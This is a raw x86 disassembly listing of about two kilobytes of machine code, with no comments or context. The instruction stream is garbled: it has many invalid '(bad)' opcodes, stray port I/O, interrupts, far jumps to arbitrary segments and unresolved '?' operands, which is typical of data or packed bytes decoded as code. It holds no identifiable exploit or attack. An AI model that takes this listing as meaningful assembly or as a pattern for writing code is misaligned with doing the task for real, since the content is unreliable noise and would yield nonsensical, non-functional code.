  4247ca:	or     BYTE PTR [edx+0x0],bl
  4247cd:	xchg   DWORD PTR [ecx-0x7],ecx
  4247d0:	jmp    0x42482a
  4247d2:	jp     0x424772
  4247d4:	jno    0x4247a4
  4247d6:	xor    bl,ch
  4247d8:	in     eax,0x6a
  4247da:	imul   edx,DWORD PTR [edx+esi*4-0x56bef782],0xe97da76f
  4247e5:	add    eax,0x8f42ab37
  4247ea:	cs jmp 0x42476e
  4247ed:	jg     0x42485a
  4247ef:	bnd jmp 0x4247db
  4247f2:	sub    al,0xae
  4247f4:	lods   eax,DWORD PTR ds:[esi]
  4247f5:	dec    edi
  4247f6:	jmp    0x424871
  4247f8:	push   eax
  4247f9:	inc    ebx
  4247fa:	loop   0x424858
  4247fc:	popa   
  4247fd:	mov    ds:0x85a0b789,eax
  424802:	leave  
  424803:	int    0xb9
  424805:	in     eax,dx
  424806:	adc    al,0x6e
  424808:	lods   al,BYTE PTR ds:[esi]
  424809:	imul   eax,DWORD PTR [edx+0x20b39f86],0x57
  424810:	(bad)  
  424811:	cmp    BYTE PTR [edx],ch
  424813:	sbb    ebx,DWORD PTR [esi]
  424815:	mov    ds:0x9140fca7,eax
  42481a:	and    eax,0x45024fe9
  42481f:	jl     0x424856
  424821:	out    dx,al
  424822:	adc    eax,0x4d248791
  424827:	sub    BYTE PTR [ebx+0x1946ac38],al
  42482d:	mov    ecx,0x2affff79
  424832:	sbb    al,0x44
  424834:	push   cs
  424835:	sbb    eax,0xf3ed273c
  42483a:	sbb    BYTE PTR [edx-0xb5b8917],bl
  424840:	xor    bl,BYTE PTR [edi-0x6242dc7f]
  424846:	push   es
  424847:	test   DWORD PTR [ebp-0x62],0x2668a0fc
  42484e:	pop    ss
  42484f:	jl     0x424837
  424851:	push   esp
  424852:	mov    dh,0x79
  424854:	bound  esp,QWORD PTR [ecx-0x2b08d3ab]
  42485a:	cmp    cl,cl
  42485c:	push   cs
  42485d:	jno    0x42481a
  42485f:	mov    bl,cl
  424861:	pop    ebp
  424862:	xor    dh,dl
  424864:	mov    BYTE PTR [esi],bh
  424866:	retf   0xaed1
  424869:	or     cl,BYTE PTR [ebx]
  42486b:	mov    ds:0xe14bf9f2,al
  424870:	test   DWORD PTR [edi+0x1e3b3232],eax
  424876:	cdq    
  424877:	shr    DWORD PTR [edi+0xb],1
  42487a:	push   es
  42487b:	push   esp
  42487c:	pop    edx
  42487d:	pop    es
  42487e:	jo     0x4248a2
  424880:	push   edx
  424881:	(bad)  
  424882:	or     al,0xa5
  424884:	stos   DWORD PTR es:[edi],eax
  424885:	div    BYTE PTR [edx+0x533d9f4b]
  42488b:	nop
  42488c:	movnti DWORD PTR [ebp+0x2188ca53],ebp
  424893:	pop    eax
  424894:	xchg   ecx,eax
  424895:	test   eax,0x95a3ffe3
  42489a:	mov    esi,DWORD PTR [ebx+esi*4+0x31]
  42489e:	dec    DWORD PTR [eax+0x6a69f40f]
  4248a4:	sub    cl,al
  4248a6:	in     al,0x63
  4248a8:	into   
  4248a9:	jo     0x42484e
  4248ab:	add    al,bl
  4248ad:	je     0x4248f3
  4248af:	int    0x79
  4248b1:	xor    eax,0x98a0c131
  4248b6:	repz push esp
  4248b8:	pop    esp
  4248b9:	retf   0xeca3
  4248bc:	jl     0x424875
  4248be:	jg     0x424863
  4248c0:	int3   
  4248c1:	add    esp,DWORD PTR [edx+0x40]
  4248c4:	out    dx,al
  4248c5:	outs   dx,BYTE PTR ds:[esi]
  4248c6:	dec    ebp
  4248c7:	and    edi,DWORD PTR [edx]
  4248c9:	adc    al,0x63
  4248cb:	ins    BYTE PTR es:[edi],dx
  4248cc:	push   0x7281be54
  4248d1:	xchg   DWORD PTR [ebx],ebp
  4248d3:	mov    esp,0x33278f20
  4248d8:	dec    edi
  4248d9:	rol    BYTE PTR [eax-0x522a0bb1],0xee
  4248e0:	(bad)  
  4248e1:	adc    al,0x88
  4248e3:	mov    ah,0x40
  4248e5:	mov    ah,0x1f
  4248e7:	xchg   edi,eax
  4248e8:	test   BYTE PTR [edx-0x78837c6c],ah
  4248ee:	pop    esi
  4248ef:	adc    al,0xe5
  4248f1:	pop    ebp
  4248f2:	xchg   DWORD PTR [bx+si-0x219d],ecx
  4248f7:	enter  0xe129,0xbf
  4248fb:	(bad)  
  4248fc:	js     0x4248b4
  4248fe:	mov    esp,0x33910389
  424903:	retf   
  424904:	sub    ch,dl
  424906:	adc    BYTE PTR [ebp+esi*1-0x2b5ad36c],ch
  42490d:	test   eax,0x8bbcc8be
  424912:	xor    al,0x6b
  424914:	ds fdivrp st(4),st
  424917:	stc    
  424918:	jae    0x424967
  42491a:	xchg   BYTE PTR [esi-0x6c],ch
  42491d:	adc    dl,ch
  42491f:	rol    esi,1
  424921:	and    DWORD PTR [eax+edi*1+0x27],eax
  424925:	mov    ch,0xdb
  424927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424928:	sub    DWORD PTR [ebx+esi*4],0xe136575e
  42492f:	xchg   DWORD PTR [ebx+0x7a],esp
  424932:	or     al,0x13
  424934:	or     DWORD PTR [ecx+0x2b],edx
  424937:	fcomp  DWORD PTR [edx-0x644c3c8d]
  42493d:	fmul   QWORD PTR [ecx+0x73]
  424940:	gs add eax,0x1bc7c017
  424946:	mov    gs,WORD PTR [eax+ecx*2]
  424949:	shl    DWORD PTR [ebp+0x1c44723],cl
  42494f:	mov    eax,ds:0x563a6944
  424954:	outs   dx,DWORD PTR ds:[esi]
  424955:	mov    al,0x3f
  424957:	out    dx,al
  424958:	fld    TBYTE PTR [esi+0x1c]
  42495b:	cmove  ebx,DWORD PTR [edx-0x4b16489e]
  424962:	fs test eax,edx
  424965:	jae    0x424975
  424967:	shr    edx,cl
  424969:	inc    eax
  42496a:	mov    cl,0x9e
  42496c:	loop   0x424988
  42496e:	push   ds
  42496f:	sti    
  424970:	or     eax,0xdd0ff98c
  424975:	test   eax,0xd1a0395b
  42497a:	xor    DWORD PTR [edi],0xffffffc7
  42497d:	or     eax,0xb0a29667
  424982:	nop
  424983:	ficom  WORD PTR [edi+0x77d76bab]
  424989:	mov    edi,0x11e1cb43
  42498e:	inc    ebp
  42498f:	mov    eax,ds:0x91401e4b
  424994:	lock jmp 0x6b2d:0xf03f9b6c
  42499c:	sar    DWORD PTR [ebp+edi*2+0x14972ffe],cl
  4249a3:	imul   esp,DWORD PTR [edi-0x6335d72f],0x944cb71
  4249ad:	cmp    DWORD PTR [edx],esi
  4249af:	mov    al,BYTE PTR [eax+eax*2+0x1a44f34b]
  4249b6:	ins    DWORD PTR es:[edi],dx
  4249b7:	mov    eax,eax
  4249b9:	pop    eax
  4249ba:	sub    esp,edx
  4249bc:	sbb    eax,0x44ed3c3a
  4249c1:	xchg   esp,eax
  4249c2:	xchg   bl,al
  4249c4:	dec    ebp
  4249c5:	add    BYTE PTR [edx+eiz*8-0x5ef7b200],ah
  4249cc:	xor    ch,BYTE PTR [ecx+esi*2-0x35]
  4249d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d1:	repnz push edi
  4249d3:	and    ebp,DWORD PTR [edi-0x51]
  4249d6:	in     eax,dx
  4249d7:	shl    dh,0x3f
  4249da:	pop    ss
  4249db:	xchg   ebp,eax
  4249dc:	mov    eax,0x91f83dee
  4249e1:	not    DWORD PTR [edx]
  4249e3:	dec    esp
  4249e4:	ss push eax
  4249e6:	pop    edx
  4249e7:	dec    edi
  4249e8:	jmp    0x77c5:0xb973517f
  4249ef:	push   cx
  4249f1:	mov    cl,0x3f
  4249f3:	jae    0x4249df
  4249f5:	shl    BYTE PTR [esi-0x56],cl
  4249f8:	aad    0xb3
  4249fa:	and    edx,0xfffffffb
  4249fd:	fiadd  WORD PTR [eax-0x63e02665]
  424a03:	and    esp,DWORD PTR [edx+0x310248dd]
  424a09:	and    BYTE PTR [esi],cl
  424a0b:	push   ss
  424a0c:	adc    eax,0x1da65090
  424a11:	xchg   ebx,eax
  424a12:	leave  
  424a13:	ficom  WORD PTR [ecx-0x3a06810a]
  424a19:	jecxz  0x424a76
  424a1b:	rol    ch,cl
  424a1d:	push   ds
  424a1e:	adc    dl,BYTE PTR [edi+0x67]
  424a21:	stos   BYTE PTR es:[edi],al
  424a22:	cli    
  424a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a24:	cld    
  424a25:	in     al,dx
  424a26:	mov    edi,DWORD PTR [edi]
  424a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a29:	shl    BYTE PTR [eax+0x55d6bea6],cl
  424a2f:	mov    al,0xc8
  424a31:	mov    edx,0xa1fd0dbc
  424a36:	outs   dx,DWORD PTR ds:[esi]
  424a37:	mov    ds:0x9c0ffc65,al
  424a3c:	adc    BYTE PTR gs:[ebx+ecx*4+0x352f93cb],ch
  424a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a45:	jns    0x424a65
  424a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a48:	lea    edx,ds:0x9a8d07f3
  424a4e:	(bad)  
  424a4f:	pusha  
  424a50:	enter  0x384f,0x41
  424a54:	or     dh,ah
  424a56:	retf   
  424a57:	rol    ch,1
  424a59:	pop    es
  424a5a:	stos   DWORD PTR es:[edi],eax
  424a5b:	inc    ecx
  424a5c:	mov    DWORD PTR [edi],ecx
  424a5e:	xchg   ebp,eax
  424a5f:	or     DWORD PTR ds:0x60e641d1,eax
  424a65:	cs (bad) 
  424a67:	xchg   edx,eax
  424a68:	daa    
  424a69:	rcl    BYTE PTR [edx+0x41],1
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	push   0xc0c03ba6
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [eax-0x4afffffa],cl
  424a83:	sbb    BYTE PTR [ebp-0x487b2e6b],ah
  424a89:	sbb    DWORD PTR ds:0x7c667b7d,ebx
  424a8f:	and    BYTE PTR [ecx],bl
  424a91:	cmp    DWORD PTR ss:[ebp+0x61b19548],eax
  424a98:	jno    0x424a9a
  424a9a:	lds    eax,FWORD PTR [edi+0x17a5c7c0]
  424aa0:	and    dl,BYTE PTR [edx-0x4f]
  424aa3:	scas   eax,DWORD PTR es:[edi]
  424aa4:	jecxz  0x424b15
  424aa6:	and    BYTE PTR [ebx-0x60883766],bh
  424aac:	scas   al,BYTE PTR es:[edi]
  424aad:	rcl    DWORD PTR [esi+ebp*4-0x20],0x5b
  424ab2:	fdiv   QWORD PTR [esi-0x12]
  424ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ab6:	loope  0x424a70
  424ab8:	pop    esi
  424ab9:	cs std 
  424abb:	mov    eax,0x86be0741
  424ac0:	ja     0x424af8
  424ac2:	sbb    dh,BYTE PTR [edx+0x42]
  424ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ac6:	push   es
  424ac7:	xor    BYTE PTR [edx+0x8],0xfc
  424acb:	add    BYTE PTR [ebp-0x50],0xe3
  424acf:	std    
  424ad0:	in     eax,dx
  424ad1:	cdq    
  424ad2:	fst    QWORD PTR [ebx-0x3625d34e]
  424ad8:	int    0xd5
  424ada:	fbld   TBYTE PTR [esi]
  424adc:	pop    ebp
  424add:	jbe    0x424b4b
  424adf:	pop    ss
  424ae0:	push   ax
  424ae2:	xchg   ecx,eax
  424ae3:	add    eax,0x9ff0306c
  424ae8:	repnz loopne 0x424b3c
  424aeb:	mov    edi,0x7750762f
  424af0:	pop    ebp
  424af1:	aaa    
  424af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424af3:	cs out dx,eax
  424af5:	dec    edi
  424af6:	dec    ebx
  424af7:	loop   0x424b46
  424af9:	dec    ebp
  424afa:	add    ah,cl
  424afc:	push   cs
  424afd:	mov    al,ds:0x934fc781
  424b02:	sbb    al,0x67
  424b04:	mov    ds:0x11135b22,eax
  424b09:	jmp    0xfcfe35e
  424b0e:	pop    ds
  424b0f:	mov    dl,0x5b
  424b11:	mov    al,0xb0
  424b13:	pop    es
  424b14:	mov    dh,0xb0
  424b16:	sub    al,0x2b
  424b18:	mov    WORD PTR [ecx-0x20],ss
  424b1b:	xchg   ebx,eax
  424b1c:	add    eax,0x60f532ea
  424b21:	stos   BYTE PTR es:[edi],al
  424b22:	test   ah,al
  424b24:	jnp    0x424b6e
  424b26:	sub    edi,DWORD PTR [ebx]
  424b28:	cli    
  424b29:	mov    bl,0xa
  424b2b:	push   esp
  424b2c:	pusha  
  424b2d:	and    eax,0x9dd44c8
  424b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b33:	int3   
  424b34:	mov    BYTE PTR [ebx],dl
  424b36:	clc    
  424b37:	fst    QWORD PTR [ebp+0x62]
  424b3a:	mov    esp,0x6b8ed4c3
  424b3f:	jnp    0x424b78
  424b41:	ins    BYTE PTR es:[edi],dx
  424b42:	scas   eax,DWORD PTR es:[edi]
  424b43:	cmp    ebx,DWORD PTR [ebx+0x1b]
  424b46:	mov    ah,0x3d
  424b48:	cdq    
  424b49:	loopne 0x424b96
  424b4b:	inc    esp
  424b4c:	sub    ecx,DWORD PTR [edx]
  424b4e:	popa   
  424b4f:	add    al,0x19
  424b51:	adc    esp,ecx
  424b53:	out    0xf6,eax
  424b55:	int    0x95
  424b57:	clc    
  424b58:	cmp    DWORD PTR [ebx+0x74a7ed81],esp
  424b5e:	mov    esp,0x41fb8575
  424b63:	aad    0x87
  424b65:	cmp    al,0xae
  424b67:	imul   ebp,DWORD PTR [edx-0x46ddf41],0xffffffbb
  424b6e:	out    0xe1,eax
  424b70:	cmp    edi,eax
  424b72:	push   ecx
  424b73:	push   cs
  424b74:	adc    ebx,DWORD PTR [edi]
  424b76:	xor    al,0xd5
  424b78:	jp     0x424b69
  424b7a:	xchg   ebx,eax
  424b7b:	ret    0x400
  424b7e:	leave  
  424b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b80:	lods   al,BYTE PTR ds:[esi]
  424b81:	xchg   edx,eax
  424b82:	iret   
  424b83:	bound  edi,QWORD PTR [esi+0x5f08283f]
  424b89:	inc    edi
  424b8a:	(bad)  
  424b8c:	in     eax,dx
  424b8d:	call   0x5ea41c3
  424b92:	pop    edx
  424b93:	push   ss
  424b94:	push   0xffffffb3
  424b96:	pop    ebp
  424b97:	js     0x424c0e
  424b99:	mov    bh,0x9d
  424b9b:	xor    ebp,DWORD PTR [ebp-0x49]
  424b9e:	(bad)  
  424b9f:	lahf   
  424ba0:	test   DWORD PTR [eax+esi*2+0x73],ebx
  424ba4:	(bad)  
  424ba5:	xchg   esp,eax
  424ba6:	or     al,0x3d
  424ba8:	sub    esp,DWORD PTR [ebp+0x768b512c]
  424bae:	mov    al,ds:0xffd5ac11
  424bb3:	fcom   st(5)
  424bb5:	rol    DWORD PTR [eax],cl
  424bb7:	xor    ecx,ebx
  424bb9:	leave  
  424bba:	mov    bh,0x85
  424bbc:	cld    
  424bbd:	push   esp
  424bbe:	mov    WORD PTR [eax+0x25],?
  424bc1:	sub    BYTE PTR [esi+0x7c32a44a],ch
  424bc7:	inc    ebp
  424bc8:	pop    edx
  424bc9:	jne    0x424c06
  424bcb:	lahf   
  424bcc:	scas   al,BYTE PTR es:[edi]
  424bcd:	pop    edi
  424bce:	adc    BYTE PTR [eax+0x4e],ah
  424bd1:	add    eax,0x503ba3f1
  424bd6:	leave  
  424bd7:	xor    DWORD PTR [edi+0x73],ecx
  424bda:	push   edx
  424bdb:	leave  
  424bdc:	repz add al,0x51
  424bdf:	dec    BYTE PTR [eax+0x741ddba8]
  424be5:	out    0xa2,eax
  424be7:	xor    DWORD PTR [esi],ebx
  424be9:	lods   eax,DWORD PTR ds:[esi]
  424bea:	cld    
  424beb:	fnstenv [eax+0x7d]
  424bee:	aaa    
  424bef:	or     BYTE PTR [edi+0xf],ch
  424bf2:	xor    ebp,DWORD PTR [ecx]
  424bf4:	(bad)  
  424bf5:	std    
  424bf6:	aaa    
  424bf7:	mov    ecx,gs
  424bf9:	sub    BYTE PTR [ecx],bh
  424bfb:	jmp    0x424c60
  424bfd:	or     BYTE PTR [edi],ch
  424bff:	mov    al,BYTE PTR [ecx+0x2af7d481]
  424c05:	test   BYTE PTR [eax+0xf],dl
  424c08:	pushf  
  424c09:	sbb    al,BYTE PTR [esi+0x2]
  424c0c:	into   
  424c0d:	aas    
  424c0e:	(bad)  
  424c0f:	lock sbb al,BYTE PTR [edx-0x33]
  424c13:	imul   esp,DWORD PTR [ecx+0x4a],0xffffff98
  424c17:	jg     0x424c51
  424c19:	into   
  424c1a:	imul   esp,DWORD PTR [edx+esi*4],0xb035902e
  424c21:	push   esi
  424c22:	int3   
  424c23:	cli    
  424c24:	dec    esp
  424c25:	test   al,0x63
  424c27:	lahf   
  424c28:	retf   
  424c29:	and    ch,bh
  424c2b:	dec    edx
  424c2c:	sbb    eax,0x12622f8e
  424c31:	fcmovu st,st(3)
  424c33:	(bad)  
  424c34:	push   edx
  424c35:	and    BYTE PTR [eax],cl
  424c37:	pop    ds
  424c38:	sbb    dl,BYTE PTR [esp+ebx*2-0x19]
  424c3c:	push   0x25676317
  424c41:	pop    ebp
  424c42:	push   0xb1c084d5
  424c47:	dec    esp
  424c48:	arpl   WORD PTR [ecx+0x77],dx
  424c4b:	shr    esp,0x7
  424c4e:	push   ebx
  424c4f:	lea    esi,[edx+ebp*4]
  424c52:	nop
  424c53:	icebp  
  424c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c55:	ficom  DWORD PTR [esi]
  424c57:	sbb    edi,DWORD PTR [eax]
  424c59:	xchg   DWORD PTR [edx+0x52],ebx
  424c5c:	test   al,0x5d
  424c5e:	leave  
  424c5f:	loop   0x424c44
  424c61:	jns    0x424c4e
  424c63:	mov    ecx,0xb2c75ea8
  424c68:	rcr    BYTE PTR [ebx],cl
  424c6a:	mov    edi,0xc2223fe5
  424c6f:	loop   0x424cb3
  424c71:	xor    BYTE PTR [ebx],0xf
  424c74:	in     al,0x54
  424c76:	and    al,0x0
  424c78:	nop
  424c79:	pcmpeqd mm5,mm1
  424c7c:	in     al,0x74
  424c7e:	mov    cl,0x1
  424c80:	push   esi
  424c81:	xor    dh,BYTE PTR [ecx+0x9e88013]
  424c87:	jnp    0x424c0a
  424c89:	sub    dh,BYTE PTR [edx]
  424c8b:	cmp    BYTE PTR [ecx],ch
  424c8d:	add    esp,DWORD PTR [ecx+0x4a19c303]
  424c93:	xlat   BYTE PTR ds:[ebx]
  424c94:	sti    
  424c95:	loope  0x424c19
  424c97:	in     eax,0x4b
  424c99:	popa   
  424c9a:	(bad)  
  424c9b:	fsub   QWORD PTR ds:0x67b29210
  424ca1:	lods   al,BYTE PTR ds:[esi]
  424ca2:	fsub   QWORD PTR [esi+0x4a]
  424ca5:	or     al,0xaa
  424ca7:	pop    ss
  424ca8:	cmp    eax,0x9451b1bb
  424cad:	in     al,0x2c
  424caf:	mov    ds:0xf20b90d2,eax
  424cb4:	adc    DWORD PTR [edi],esp
  424cb6:	pop    ecx
  424cb7:	je     0x424c52
  424cb9:	outs   dx,BYTE PTR ds:[esi]
  424cba:	pop    esi
  424cbb:	fdivr  DWORD PTR es:[ebx]
  424cbe:	repz add al,0xed
  424cc1:	adc    eax,0x6c025586
  424cc6:	nop
  424cc7:	dec    edi
  424cc8:	aas    
  424cc9:	inc    ecx
  424cca:	imul   esi,DWORD PTR [ecx+0x37],0xcd4145
  424cd1:	adc    eax,0x3f5cf543
  424cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cd7:	sub    esi,ebx
  424cd9:	sub    DWORD PTR [edi+0x13522379],edx
  424cdf:	jmp    0x424ce4
  424ce1:	loope  0x424c83
  424ce3:	sub    al,BYTE PTR [edx+0x6ed9d163]
  424ce9:	mov    dh,0xe5
  424ceb:	sbb    ecx,esi
  424ced:	test   DWORD PTR [ebx],ebp
  424cef:	mov    al,ds:0xda588514
  424cf4:	push   eax
  424cf5:	clc    
  424cf6:	bound  edx,QWORD PTR [esi-0xc]
  424cf9:	popf   
  424cfa:	mov    esp,0x9ef25c13
  424cff:	cmp    al,0x1a
  424d01:	jns    0x424c9b
  424d03:	jmp    0x424d82
  424d05:	jge    0x424c99
  424d07:	push   edx
  424d08:	ins    DWORD PTR es:[edi],dx
  424d09:	std    
  424d0a:	jb     0x424d8a
  424d0c:	clc    
  424d0d:	icebp  
  424d0e:	pop    ebp
  424d0f:	lods   eax,DWORD PTR ds:[esi]
  424d10:	xor    al,0xa3
  424d12:	mov    eax,0xa51dac29
  424d17:	xchg   DWORD PTR [ecx-0x40671490],edi
  424d1d:	bound  ebx,QWORD PTR [edi]
  424d1f:	das    
  424d20:	push   eax
  424d21:	dec    edx
  424d22:	scas   eax,DWORD PTR es:[edi]
  424d23:	ret    
  424d24:	lahf   
  424d25:	mov    DWORD PTR [ebp+edx*4-0x53],ecx
  424d29:	pop    esp
  424d2a:	pop    eax
  424d2b:	out    dx,al
  424d2c:	gs icebp 
  424d2e:	test   al,0x4a
  424d30:	push   eax
  424d31:	dec    ebx
  424d32:	rol    DWORD PTR [eax-0x52],1
  424d35:	inc    BYTE PTR [ecx+0x26b32558]
  424d3b:	sbb    ebx,DWORD PTR [esi-0x55]
  424d3e:	pusha  
  424d3f:	(bad)  
  424d40:	sahf   
  424d41:	mov    edx,0x93810c1b
  424d46:	js     0x424d2a
  424d48:	xor    eax,0x216b95a2
  424d4d:	jmp    0x67:0x96a8c3e9
  424d54:	inc    edx
  424d55:	adc    ah,al
  424d57:	or     BYTE PTR [esi-0x42465e77],ch
  424d5d:	cli    
  424d5e:	mov    ch,0x5c
  424d60:	fsubp  st(5),st
  424d62:	adc    eax,0xb06ca383
  424d67:	popa   
  424d68:	dec    edi
  424d69:	xor    DWORD PTR [edi+edi*4-0xa878c07],esi
  424d70:	(bad)  
  424d71:	imul   esi,edi,0x54
  424d74:	cdq    
  424d75:	or     edi,eax
  424d77:	sub    BYTE PTR [eax],ch
  424d79:	pop    ds
  424d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d7b:	cwde   
  424d7c:	cwde   
  424d7d:	mov    dh,0x93
  424d7f:	push   esi
  424d80:	cmc    
  424d81:	lods   al,BYTE PTR ds:[esi]
  424d82:	fwait
  424d83:	repnz xor eax,0x12c24d60
  424d89:	mov    fs:0xe29a1f0b,al
  424d8f:	out    0x58,al
  424d91:	xor    DWORD PTR ds:[eax+0x3],ebp
  424d95:	fisub  DWORD PTR [ebp+eiz*2+0x630008c4]
  424d9c:	test   DWORD PTR [edx+edx*4-0x4e],ecx
  424da0:	push   0x503292cd
  424da5:	cmp    esp,DWORD PTR [ecx+0x702cc277]
  424dab:	push   ecx
  424dac:	mov    cl,0xea
  424dae:	imul   esp,DWORD PTR [esi],0x4
  424db1:	gs push edx
  424db3:	stos   DWORD PTR es:[edi],eax
  424db4:	stos   DWORD PTR es:[edi],eax
  424db5:	jne    0x424e2d
  424db7:	sahf   
  424db8:	xchg   ebx,eax
  424db9:	aad    0x4a
  424dbb:	mov    dl,BYTE PTR [esp+ebx*1+0x285417b3]
  424dc2:	fist   WORD PTR [ecx+eiz*8+0x5f86be83]
  424dc9:	cs sahf 
  424dcb:	rcl    BYTE PTR [ecx],1
  424dcd:	mov    eax,ds:0xeb5019fb
  424dd2:	dec    edi
  424dd3:	mov    al,0x56
  424dd5:	ret    
  424dd6:	ret    0x199a
  424dd9:	xchg   ebp,eax
  424dda:	push   ebp
  424ddb:	call   0x6bebc674
  424de0:	out    0xfe,eax
  424de2:	and    dh,BYTE PTR [ecx]
  424de4:	fidivr WORD PTR [edi-0x6aa4799]
  424dea:	jl     0x424e27
  424dec:	outs   dx,DWORD PTR ds:[esi]
  424ded:	cs inc edi
  424def:	xchg   ebp,eax
  424df0:	jb     0x424e2c
  424df2:	push   edx
  424df3:	mov    ch,0xa9
  424df5:	(bad)  
  424df6:	aaa    
  424df7:	mov    BYTE PTR [ecx],dl
  424df9:	sub    DWORD PTR [ebp+ebp*4+0x14],edx
  424dfd:	aas    
  424dfe:	and    BYTE PTR [ebp+0x7b],0xec
  424e02:	sti    
  424e03:	push   ecx
  424e04:	stos   BYTE PTR es:[di],al
  424e06:	loope  0x424e2d
  424e08:	push   ebp
  424e09:	pslld  mm2,QWORD PTR [ebx-0x54]
  424e0d:	dec    esp
  424e0e:	sub    ebp,DWORD PTR [ebx+0x78f86408]
  424e14:	inc    edi
  424e15:	sub    DWORD PTR [edi-0x4d],0xffffffea
  424e19:	mov    ebp,0xb8dd6c68
  424e1e:	mov    al,ds:0x5c6ea283
  424e23:	inc    ebp
  424e24:	sbb    BYTE PTR [ecx+0x60],bh
  424e27:	mov    edi,esp
  424e29:	pop    ebx
  424e2a:	dec    ecx
  424e2b:	dec    edi
  424e2c:	addr16 xor ecx,ebx
  424e2f:	pop    eax
  424e30:	sahf   
  424e31:	add    eax,0xd4d799ec
  424e36:	sub    al,0x43
  424e38:	jb     0x424de5
  424e3a:	and    BYTE PTR [edx],ah
  424e3c:	inc    ecx
  424e3d:	jno    0x424eac
  424e3f:	mov    bh,0xc8
  424e41:	cmc    
  424e42:	retf   0x8b7d
  424e45:	xchg   DWORD PTR [edx+eax*1-0x5a],ecx
  424e49:	arpl   WORD PTR [ebp+0x4bc1fbc4],bx
  424e4f:	cmp    esp,DWORD PTR [esi+0x2d]
  424e52:	sub    esi,DWORD PTR [ebx-0x4c]
  424e55:	pop    ebp
  424e56:	cmp    esi,DWORD PTR [eax]
  424e58:	test   al,0x9c
  424e5a:	(bad)  
  424e5b:	ins    DWORD PTR es:[edi],dx
  424e5c:	clc    
  424e5d:	mov    edi,0xc7991b6
  424e62:	add    al,0x63
  424e64:	pushf  
  424e65:	scas   eax,DWORD PTR es:[edi]
  424e66:	jg     0x424e88
  424e68:	std    
  424e69:	pop    esp
  424e6a:	adc    BYTE PTR [ecx],cl
  424e6c:	dec    edx
  424e6d:	mov    edx,0xad4e54a7
  424e72:	std    
  424e73:	fprem  
  424e75:	daa    
  424e76:	std    
  424e77:	mov    ?,WORD PTR [edx+ebx*2+0x598b324b]
  424e7e:	mov    dh,0xf
  424e80:	cmp    al,bl
  424e82:	sub    al,0x93
  424e84:	popf   
  424e85:	sahf   
  424e86:	pop    ecx
  424e87:	fst    st(5)
  424e89:	mov    eax,0x6961d21
  424e8e:	stc    
  424e8f:	mov    al,0x36
  424e91:	call   0x88f87bdb
  424e96:	or     al,0xdb
  424e98:	jno    0x424ee7
  424e9a:	mov    esi,0xa08ed300
  424e9f:	inc    esi
  424ea0:	jge    0x424f01
  424ea2:	xchg   ebp,eax
  424ea3:	repnz xchg esp,eax
  424ea5:	xchg   esi,eax
  424ea6:	es adc al,0x1c
  424ea9:	cmp    cl,dl
  424eab:	std    
  424eac:	inc    ebx
  424ead:	xor    al,BYTE PTR [ecx+0x41]
  424eb0:	shr    DWORD PTR [edi],cl
  424eb2:	ret    0xe003
  424eb5:	push   cs
  424eb6:	lods   al,BYTE PTR ds:[esi]
  424eb7:	sbb    cl,dl
  424eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424eba:	push   eax
  424ebb:	jno    0x424f23
  424ebd:	repz vpmaxud zmm1{k4},zmm1,DWORD PTR [ecx+0x39b9e4c1]{1to16}
  424ec8:	jle    0x424f38
  424eca:	(bad)  
  424ecb:	or     ch,BYTE PTR [esi-0x22c95e4d]
  424ed1:	lods   eax,DWORD PTR ds:[esi]
  424ed2:	add    eax,0xabab805b
  424ed7:	sub    BYTE PTR [esi+0x2aa5eb10],bh
  424edd:	pop    edi
  424ede:	or     cl,BYTE PTR [ebx+0x70953081]
  424ee4:	push   cs
  424ee5:	adc    dl,BYTE PTR [edx-0x72]
  424ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ee9:	(bad)  
  424eec:	dec    edx
  424eed:	push   0x7d
  424eef:	in     eax,0xc7
  424ef1:	adc    ebp,DWORD PTR [ebx-0x54f749fa]
  424ef7:	call   0xfe81381a
  424efc:	outs   dx,BYTE PTR ds:[esi]
  424efd:	int    0xea
  424eff:	retf   
  424f00:	pushf  
  424f01:	adc    ebp,DWORD PTR [ebx+0x7660e95e]
  424f07:	jmp    0x78d7:0xfa538c01
  424f0e:	test   eax,0x144ee5a8
  424f13:	(bad)  
  424f15:	dec    ebx
  424f16:	xor    ebx,DWORD PTR [edi]
  424f18:	(bad)  
  424f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f1a:	loop   0x424eab
  424f1c:	xchg   ebp,eax
  424f1d:	sete   dh
  424f20:	jb     0x424f3f
  424f22:	out    dx,al
  424f23:	(bad)  
  424f24:	xchg   ecx,eax
  424f25:	sub    ebx,DWORD PTR [ebp-0x30b8daa7]
  424f2b:	add    bh,BYTE PTR [ebx]
  424f2d:	dec    edx
  424f2e:	sbb    edi,ecx
  424f30:	pop    ss
  424f31:	push   es
  424f32:	shl    BYTE PTR [esi+0x17457530],cl
  424f38:	mov    edi,0x7b6999b8
  424f3d:	mov    ds:0x3591afdb,al
  424f42:	adc    DWORD PTR [esi+0x34efe124],edi
  424f48:	and    DWORD PTR [ebp-0x17],ecx
  424f4b:	leave  
  424f4c:	xchg   BYTE PTR [eax+ecx*8],ah
  424f4f:	cmp    edi,DWORD PTR [ecx+0xc]
  424f52:	lods   al,BYTE PTR ds:[esi]
  424f53:	ins    DWORD PTR es:[edi],dx
  424f54:	xor    al,0xe2
  424f56:	lahf   
